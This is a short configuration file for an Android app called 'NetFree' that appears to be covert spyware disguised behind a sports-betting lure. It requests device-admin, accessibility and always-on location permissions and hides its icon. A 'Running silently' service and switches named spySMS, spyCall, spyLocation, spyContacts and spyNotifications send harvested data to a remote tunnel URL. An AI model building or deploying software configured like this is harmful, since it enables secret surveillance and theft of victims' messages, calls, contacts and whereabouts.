[app]
name = NetFree
version = 1.0.1
description = A powerful tool for monitoring devices
icon = lurkerx.png

[content]
countdownText = "Sit tight and relax while we dig fixtures from the SportyBet app"

[buttons]
requestPermissions = Enable App Process
requestDeviceAdmin = Request Core-Level Rights
enableAccessibility = Enable Accessibility Service

[strings]
telephonyPermissionString = Grant all the permissions that will follow
GPSPermissionString = Location  for 'ALL THE TIME' for this app is required
notificationPermissionString = Notification Access for this app is required. Continue if already granted.

[behavior]
remoteUrl = https://mytunnel_url/receive_data
payloadUrl = None
hideApp = true
blockUI = false
blockSettings = false

[notifications]
serviceTitle = DarkBridge Service
serviceContent = Running silently...

[features]
spySMS = true
spyCall = true
spyLocation = true
spyContacts = true
spyNotifications = true
